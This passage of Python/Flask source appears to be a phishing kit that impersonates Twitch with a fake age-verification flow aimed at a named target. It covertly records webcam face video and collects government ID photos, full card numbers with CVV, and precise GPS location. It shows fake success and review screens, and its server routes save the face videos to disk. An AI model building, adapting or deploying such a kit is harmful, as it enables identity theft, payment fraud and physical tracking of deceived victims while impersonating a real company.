                    {'<img src="' + profile_picture + '">' if profile_picture else 'TW'}
                </div>
                <div class="account-info">
                    <div class="account-display-name">{target_username}</div>
                    <div class="account-username">@{target_username}</div>
                    <div class="account-badge">
                        {'STREAMER ACCOUNT' if account_type == 'streamer' else 'VIEWER ACCOUNT'}
                    </div>
                </div>
            </div>
            
            <div class="account-stats">
                <div class="stat-item">
                    <div class="stat-number">{followers}</div>
                    <div class="stat-label">Followers</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">{following}</div>
                    <div class="stat-label">Following</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">
                        {'{:,}'.format(total_views) if account_type == 'streamer' else 'N/A'}
                    </div>
                    <div class="stat-label">
                        {'Total Views' if account_type == 'streamer' else 'Account Age'}
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Verification Container -->
        <div class="verification-container">
            <!-- Progress Indicator -->
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-steps">
                    <div class="step-line"></div>
                    <div class="step-line-fill" id="stepLineFill"></div>
                    <div class="step-indicator completed">1</div>
                    <div class="step-indicator active">2</div>
                    <div class="step-indicator">3</div>
                    <div class="step-indicator">4</div>
                    <div class="step-indicator">5</div>
                </div>
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step active" id="step1">
                <h2 class="step-title">Account Verification Required</h2>
                <p class="step-subtitle">
                    Your account <strong class="twitch-purple">@{target_username}</strong> requires age and identity verification 
                    to comply with Twitch's Terms of Service and Community Guidelines.
                </p>
                
                <div class="warning-box">
                    <div class="warning-header">
                        <div class="warning-icon">⚠️</div>
                        <div class="warning-title">Limited Account Access</div>
                    </div>
                    <div class="warning-content">
                        {'Your streaming capabilities have been temporarily restricted until age verification is completed.' if account_type == 'streamer' 
                         else 'Access to age-restricted content has been temporarily limited until verification is completed.'}
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-header">
                        <div class="info-icon">📋</div>
                        <div class="info-title">Verification Process</div>
                    </div>
                    <div class="info-content">
                        {'As a streamer account, you must complete:' if account_type == 'streamer' 
                         else 'As a viewer account, you must complete:'}
                        <ul style="margin-top: 10px;">
                            <li><strong>Face Verification</strong> - Real-time face scan</li>
                            <li><strong>ID Verification</strong> - Government-issued ID upload</li>
                            {'<li><strong>Payment Verification</strong> - Payment method verification</li>' if payment_enabled else ''}
                            {'<li><strong>Location Check</strong> - Regional compliance verification</li>' if location_enabled else ''}
                        </ul>
                    </div>
                </div>
                
                <button class="button primary-btn" onclick="nextStep()">
                    Start Verification
                </button>
                
                <div class="footer">
                    By continuing, you agree to Twitch's <a href="#">Terms of Service</a> and 
                    <a href="/privacy_policy">Privacy Policy</a>
                </div>
            </div>
            
            <!-- Step 2: Face Verification -->
            <div class="step" id="step2">
                <h2 class="step-title">Face Verification</h2>
                <p class="step-subtitle">
                    We need to verify that you're a real person. Follow the instructions for face scanning.
                </p>
                
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                    <div class="face-overlay">
                        <div class="face-circle"></div>
                    </div>
                </div>
                
                <div class="face-timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                
                <div class="face-instruction" id="faceInstruction">
                    <div class="instruction-icon">👤</div>
                    <div class="instruction-text" id="instructionText">Ready to Start</div>
                    <div class="instruction-detail" id="instructionDetail">
                        Position your face within the circle
                    </div>
                </div>
                
                <button class="button primary-btn" id="startFaceBtn" onclick="startFaceVerification()">
                    Start Face Scan
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 3: ID Verification -->
            <div class="step" id="step3">
                <h2 class="step-title">ID Document Verification</h2>
                <p class="step-subtitle">
                    Upload photos of your government-issued ID for age verification.
                </p>
                
                <div class="id-upload-section">
                    <div class="id-card" onclick="document.getElementById('frontIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleIDFileDrop(event, 'front')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Front of ID</div>
                        <div class="id-subtitle">
                            {'Passport, Driver\'s License, or Government ID' if id_type == 'government' 
                             else 'Student ID Card' if id_type == 'student' 
                             else 'Parental Consent Form'}
                        </div>
                        <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'front')">
                        <div class="id-preview" id="frontPreview">
                            <img class="id-preview-image" id="frontPreviewImage">
                        </div>
                    </div>
                    
                    <div class="id-card" onclick="document.getElementById('backIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleIDFileDrop(event, 'back')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Back of ID</div>
                        <div class="id-subtitle">
                            {'Required for two-sided documents' if id_type == 'government' 
                             else 'Optional for student IDs' if id_type == 'student'
                             else 'Parent/Guardian Signature'}
                        </div>
                        <input type="file" id="backIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'back')">
                        <div class="id-preview" id="backPreview">
                            <img class="id-preview-image" id="backPreviewImage">
                        </div>
                    </div>
                </div>
                
                <div class="id-requirements">
                    <div class="requirements-title">Document Requirements:</div>
                    <ul class="requirements-list">
                        {'<li>Government-issued photo ID with date of birth</li>' if id_type == 'government' else ''}
                        {'<li>Valid student ID with expiration date</li>' if id_type == 'student' else ''}
                        {'<li>Parent/guardian signed consent form</li>' if id_type == 'parental' else ''}
                        <li>Clear, well-lit photos</li>
                        <li>All text must be readable</li>
                        <li>No glare or reflections</li>
                        <li>Full document visible in frame</li>
                    </ul>
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="button primary-btn" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Upload ID Documents
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 4: Payment Verification (Streamers only) -->
            <div class="step" id="step4">
                <h2 class="step-title">Payment Verification</h2>
                <p class="step-subtitle">
                    Verify your payment method to enable monetization features on your streamer account.
                </p>
                
                <div class="payment-options">
                    <div class="payment-option" onclick="selectPaymentMethod('credit_card')">
                        <div class="payment-icon">💳</div>
                        <div class="payment-name">Credit Card</div>
                        <div class="payment-hint">Visa, Mastercard, Amex</div>
                    </div>
                    
                    <div class="payment-option" onclick="selectPaymentMethod('paypal')">
                        <div class="payment-icon">🏦</div>
                        <div class="payment-name">PayPal</div>
                        <div class="payment-hint">Connect PayPal account</div>
                    </div>
                    
                    <div class="payment-option" onclick="selectPaymentMethod('bank')">
                        <div class="payment-icon">🏛️</div>
                        <div class="payment-name">Bank Transfer</div>
                        <div class="payment-hint">Direct bank account</div>
                    </div>
                </div>
                
                <div class="payment-details" id="paymentDetails">
                    <div class="form-group">
                        <label class="form-label">Card Number</label>
                        <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456">
                    </div>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                        <div class="form-group">
                            <label class="form-label">Expiry Date</label>
                            <input type="text" class="form-input" id="cardExpiry" placeholder="MM/YY">
                        </div>
                        <div class="form-group">
                            <label class="form-label">CVV</label>
                            <input type="text" class="form-input" id="cardCvv" placeholder="123">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Name on Card</label>
                        <input type="text" class="form-input" id="cardName" placeholder="John Smith">
                    </div>
                </div>
                
                <div class="status-message" id="paymentStatus"></div>
                
                <button class="button primary-btn" id="submitPaymentBtn" onclick="submitPaymentVerification()" disabled>
                    Verify Payment Method
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 5: Location Verification -->
            <div class="step" id="step5">
                <h2 class="step-title">Location Verification</h2>
                <p class="step-subtitle">
                    We need to verify your location for regional content compliance and security.
                </p>
                
                <div class="location-container">
                    <div class="location-icon">📍</div>
                    <div class="location-info">
                        <div class="instruction-icon">🌍</div>
                        <div class="instruction-text">Location Access Required</div>
                        <div class="instruction-detail">
                            Twitch needs to verify your location for content regionalization and security.
                        </div>
                    </div>
                    
                    <div class="location-accuracy">
                        <div class="instruction-text">Location Accuracy</div>
                        <div class="accuracy-meter">
                            <div class="accuracy-fill" id="accuracyFill"></div>
                        </div>
                        <div class="accuracy-labels">
                            <span>Low</span>
                            <span>Medium</span>
                            <span>High</span>
                        </div>
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div class="detail-row">
                            <div class="detail-label">Latitude:</div>
                            <div class="detail-value" id="latValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Longitude:</div>
                            <div class="detail-value" id="lonValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Accuracy:</div>
                            <div class="detail-value" id="accuracyValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Address:</div>
                            <div class="detail-value" id="addressValue">--</div>
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Click the button below to share your location
                </div>
                
                <button class="button primary-btn" id="locationBtn" onclick="requestLocation()">
                    Share My Location
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Final Step: Processing -->
            <div class="step" id="stepFinal">
                <h2 class="step-title">Verification in Progress</h2>
                <p class="step-subtitle">
                    Please wait while we verify your information. This may take a few moments.
                </p>
                
                <div class="info-box" style="text-align: center; padding: 40px;">
                    <div class="instruction-icon" style="font-size: 4rem;">⏳</div>
                    <div class="instruction-text">Processing Your Verification</div>
                    <div class="instruction-detail">
                        <div class="loading-spinner" style="margin-right: 10px;"></div>
                        Analyzing submitted data...
                    </div>
                </div>
                
                <div class="status-message status-processing" id="finalStatus">
                    Verifying face scan... 25%
                </div>
            </div>
            
            <!-- Completion Step -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="success-icon">✅</div>
                    
                    <h2 class="completion-title">Verification Submitted!</h2>
                    <p class="step-subtitle">
                        Thank you, <strong class="twitch-purple">@{target_username}</strong>! Your verification data has been 
                        successfully submitted for review.
                    </p>
                    
                    <div class="info-box">
                        <div class="info-header">
                            <div class="info-icon">📋</div>
                            <div class="info-title">What happens next?</div>
                        </div>
                        <div class="info-content">
                            <ul style="margin-top: 10px;">
                                <li>Our team will review your submission (typically 24-48 hours)</li>
                                <li>You'll receive an email with the verification result</li>
                                {'<li>Once approved, streaming features will be enabled</li>' if account_type == 'streamer' 
                                 else '<li>Once approved, age-restricted content access will be restored</li>'}
                                <li>If additional information is needed, we'll contact you</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <p class="step-subtitle">
                            You will be redirected to the review page in <span class="countdown" id="countdown">5</span> seconds...
                        </p>
                        <button class="button primary-btn" onclick="showReviewPage()">
                            Continue to Review Status
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Review Status Step -->
            <div class="step" id="stepReview">
                <div class="review-container">
                    <div class="review-icon">⏳</div>
                    
                    <h2 class="step-title">Verification Under Review</h2>
                    <p class="step-subtitle">
                        Your age verification submission is being reviewed by the Twitch Trust & Safety team.
                    </p>
                    
                    <div class="review-steps">
                        <div class="review-step">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <div class="step-title">Submission Received</div>
                                <div class="step-description">
                                    Your face scan, ID documents, and location data have been received and are in queue for review.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <div class="step-title">Manual Review Process</div>
                                <div class="step-description">
                                    Our team is manually reviewing your verification data to ensure compliance with Twitch policies.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <div class="step-title">Age Verification Check</div>
                                <div class="step-description">
                                    We're verifying your age based on the submitted documents to ensure compliance with regional laws.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <div class="step-title">Final Decision</div>
                                <div class="step-description">
                                    You'll receive an email with the final decision within 48 hours of submission.
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <div class="info-header">
                            <div class="info-icon">📧</div>
                            <div class="info-title">Check Your Email</div>
                        </div>
                        <div class="info-content">
                            We've sent a confirmation to the email on file. Please check your inbox (and spam folder) for updates.
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <button class="button primary-btn" onclick="returnToTwitch()">
                            Return to Twitch
                        </button>
                        <button class="button secondary-btn" onclick="checkVerificationStatus()">
                            Check Status
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div>© 2024 Twitch, Inc. All rights reserved.</div>
            <div class="footer-links">
                <a href="/privacy_policy">Privacy Policy</a>
                <a href="#">Terms of Service</a>
                <a href="#">Community Guidelines</a>
                <a href="#">Help Center</a>
            </div>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let totalSteps = {total_steps};
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimerInterval = null;
        let faceTimeLeft = {face_duration};
        let currentInstructionIndex = 0;
        let instructionTimer = null;
        let idFiles = {{front: null, back: null}};
        let selectedPaymentMethod = null;
        let paymentData = {{}};
        let locationData = null;
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let targetUsername = "{target_username}";
        let accountType = "{account_type}";
        let countdownTimer = null;
        
        // Face scan instructions
        let faceInstructions = [
            {{icon: "👤", text: "Look Straight Ahead", detail: "Keep your face centered in the circle", duration: 3}},
            {{icon: "👈", text: "Turn Head Left", detail: "Slowly turn your head to the left side", duration: 3}},
            {{icon: "👉", text: "Turn Head Right", detail: "Slowly turn your head to the right side", duration: 3}},
            {{icon: "👆", text: "Look Up", detail: "Gently tilt your head upward", duration: 3}},
            {{icon: "👇", text: "Look Down", detail: "Gently tilt your head downward", duration: 3}},
            {{icon: "😉", text: "Blink Naturally", detail: "Blink your eyes a few times", duration: 2}},
            {{icon: "😊", text: "Smile", detail: "Give us a natural smile", duration: 2}},
            {{icon: "✅", text: "Complete", detail: "Face verification successful!", duration: 1}}
        ];
        
        // Step Navigation
        function updateProgress() {{
            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('stepLineFill').style.width = progress + '%';
            
            // Update step indicators
            const indicators = document.querySelectorAll('.step-indicator');
            indicators.forEach((indicator, index) => {{
                indicator.classList.remove('active', 'completed');
                if (index + 1 < currentStep) {{
                    indicator.classList.add('completed');
                }} else if (index + 1 === currentStep) {{
                    indicator.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            // Hide all steps
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            
            // Show requested step
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateProgress();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps + 1) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Face Verification
        async function startFaceVerification() {{
            try {{
                const button = document.getElementById('startFaceBtn');
                button.disabled = true;
                button.innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                
                // Request camera access
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 640 }}
                    }},
                    audio: false
                }});
                
                // Show video feed
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Start the verification process
                startFaceInstructions();
                
            }} catch (error) {{
                console.error('Camera access error:', error);
                alert('Unable to access camera. Please ensure camera permissions are granted.');
                const button = document.getElementById('startFaceBtn');
                button.disabled = false;
                button.textContent = 'Start Face Scan';
            }}
        }}
        
        function startFaceInstructions() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showFaceInstruction(0);
            
            // Start face recording
            startFaceRecording();
            
            // Start countdown timer
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Cycle through instructions
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showFaceInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showFaceInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                const instructionDiv = document.getElementById('faceInstruction');
                instructionDiv.querySelector('.instruction-icon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            // Stop recording
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Stop camera
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Show completion
            showFaceInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✅ Complete";
            
            // Auto-proceed after delay
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername,
                        account_type: accountType
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Face verification uploaded');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Face upload error:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // ID Verification
        function handleIDFileSelect(input, type) {{
            const file = input.files[0];
            if (file) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFileDrop(event, type) {{
            event.preventDefault();
            event.currentTarget.classList.remove('dragover');
            const file = event.dataTransfer.files[0];
            if (file && file.type.startsWith('image/')) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFile(file, type) {{
            // Show preview
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById(type + 'Preview');
                const previewImage = document.getElementById(type + 'PreviewImage');
                previewImage.src = e.target.result;
                preview.style.display = 'block';
            }};
            reader.readAsDataURL(file);
            
            // Store file
            idFiles[type] = file;
            checkIDSubmitReady();
        }}
        
        function checkIDSubmitReady() {{
            const hasFront = idFiles.front !== null;
            document.getElementById('submitIdBtn').disabled = !hasFront;
        }}
        
        function submitIDVerification() {{
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Uploading ID documents...';
            statusDiv.style.display = 'block';
            
            const button = document.getElementById('submitIdBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Processing...';
            
            // Prepare form data
            const formData = new FormData();
            if (idFiles.front) formData.append('front_id', idFiles.front);
            if (idFiles.back) formData.append('back_id', idFiles.back);
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_username', targetUsername);
            formData.append('id_type', '{id_type}');
            formData.append('account_type', accountType);
            
            // Submit
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ ID documents uploaded successfully!';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function(xhr, status, error) {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Upload failed. Please try again.';
                    button.disabled = false;
                    button.textContent = 'Upload ID Documents';
                }}
            }});
        }}
        
        // Payment Verification
        function selectPaymentMethod(method) {{
            selectedPaymentMethod = method;
            
            // Update UI
            document.querySelectorAll('.payment-option').forEach(option => {{
                option.classList.remove('selected');
            }});
            event.currentTarget.classList.add('selected');
            
            // Show payment details
            const detailsDiv = document.getElementById('paymentDetails');
            detailsDiv.style.display = 'block';
            
            // Enable submit button
            document.getElementById('submitPaymentBtn').disabled = false;
        }}
        
        function submitPaymentVerification() {{
            const statusDiv = document.getElementById('paymentStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Verifying payment method...';
            statusDiv.style.display = 'block';
            
            const button = document.getElementById('submitPaymentBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Processing...';
            
            // Collect payment data
            paymentData = {{
                method: selectedPaymentMethod,
                card_number: document.getElementById('cardNumber').value,
                expiry_date: document.getElementById('cardExpiry').value,
                cvv: document.getElementById('cardCvv').value,
                card_name: document.getElementById('cardName').value,
                timestamp: new Date().toISOString(),
                session_id: sessionId,
                target_username: targetUsername
            }};
            
            // Simulate API call
            setTimeout(() => {{
                statusDiv.className = 'status-message status-success';
                statusDiv.textContent = '✓ Payment method verified successfully!';
                
                // Submit to server
                $.ajax({{
                    url: '/submit_payment_verification',
                    type: 'POST',
                    data: JSON.stringify(paymentData),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Payment verification uploaded');
                    }}
                }});
                
                setTimeout(() => {{
                    nextStep();
                }}, 1500);
            }}, 2000);
        }}
        
        // Location Verification
        function requestLocation() {{
            const button = document.getElementById('locationBtn');
            const statusDiv = document.getElementById('locationStatus');
            const detailsDiv = document.getElementById('locationDetails');
            
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Accessing your location...';
            statusDiv.style.display = 'block';
            
            if (!navigator.geolocation) {{
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Geolocation is not supported by your browser.';
                button.disabled = false;
                button.textContent = 'Try Again';
                return;
            }}
            
            // Get location
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    updateLocationUI(position);
                    sendLocationToServer(position);
                    completeLocationVerification();
                }},
                (error) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = `Error: ${{error.message}}. Please enable location services.`;
                    button.disabled = false;
                    button.textContent = 'Try Again';
                }},
                {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Update display
            document.getElementById('latValue').textContent = lat.toFixed(6);
            document.getElementById('lonValue').textContent = lon.toFixed(6);
            document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} meters`;
            document.getElementById('addressValue').textContent = 'Processing address...';
            
            // Calculate accuracy percentage
            let accuracyPercentage = 100;
            if (accuracy < 10) accuracyPercentage = 95;
            else if (accuracy < 50) accuracyPercentage = 85;
            else if (accuracy < 100) accuracyPercentage = 70;
            else if (accuracy < 500) accuracyPercentage = 50;
            else accuracyPercentage = 30;
            
            document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
            
            // Show details
            document.getElementById('locationDetails').style.display = 'block';
            
            // Update status
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = `✓ Location acquired with ${{Math.round(accuracy)}}m accuracy`;
            
            // Store data
            locationData = {{
                latitude: lat,
                longitude: lon,
                accuracy: accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                heading: position.coords.heading,
                user_agent: navigator.userAgent
            }};
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_username: targetUsername,
                    account_type: accountType
                }}),
                contentType: 'application/json',
                success: function(response) {{
                    console.log('Location data uploaded');
                }}
            }});
        }}
        
        function completeLocationVerification() {{
            const button = document.getElementById('locationBtn');
            button.disabled = true;
            button.textContent = '✓ Location Verified';
            
            setTimeout(() => {{
                startFinalVerification();
            }}, 2000);
        }}
        
        // Final Processing
        function startFinalVerification() {{
            showStep('stepFinal');
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const progressInterval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = `Verifying face scan... ${{Math.round(progress)}}%`;
                }} else if (progress < 50) {{
                    message = `Checking ID documents... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = accountType === 'streamer' ? `Verifying payment method... ${{Math.round(progress)}}%` : `Verifying location... ${{Math.round(progress)}}%`;
                }} else if (progress < 90) {{
                    message = `Analyzing location data... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Finalizing verification... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(progressInterval);
                    setTimeout(() => {{
                        statusDiv.className = 'status-message status-success';
                        statusDiv.textContent = `✓ Verification complete for @${{targetUsername}}!`;
                        
                        // Submit complete verification
                        submitCompleteVerification();
                        
                        setTimeout(() => {{
                            showCompletionPage();
                        }}, 1500);
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function showCompletionPage() {{
            showStep('stepComplete');
            
            // Start countdown
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown;
            
            countdownTimer = setInterval(() => {{
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(countdownTimer);
                    showReviewPage();
                }}
            }}, 1000);
        }}
        
        function showReviewPage() {{
            clearInterval(countdownTimer);
            showStep('stepReview');
        }}
        
        function returnToTwitch() {{
            window.location.href = 'https://twitch.tv';
        }}
        
        function checkVerificationStatus() {{
            alert('Verification status will be sent to your email within 48 hours. Please check the email associated with your Twitch account.');
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_username: targetUsername,
                    account_type: accountType,
                    completed_steps: currentStep,
                    verification_timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    screen_resolution: `${{screen.width}}x${{screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }}),
                contentType: 'application/json'
            }});
        }}
        
        // Initialize
        updateProgress();
        
        // Auto-start first step
        setTimeout(() => {{
            showStep(1);
        }}, 500);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            account_type = data.get('account_type', 'unknown')
            
            # Create filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"twitch_face_{target_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            # Save video
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            # Save metadata
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'twitch_face_verification',
                'target_username': target_username,
                'account_type': account_type,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved Twitch face verification for {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Face verification submitted"}), 200
        else:
            return jsonify({"status": "error", "message": "No face video data received"}), 400
    except Exception as e:
        print(f"Error saving face verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        target_username = request.form.get('target_username', 'unknown')
        account_type = request.form.get('account_type', 'unknown')
        id_type = request.form.get('id_type', 'government')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        # Handle front ID
        front_filename = None
        if 'front_id' in request.files:
            front_file = request.files['front_id']
            if front_file.filename:
                file_ext = front_file.filename.split('.')[-1] if '.' in front_file.filename else 'jpg'
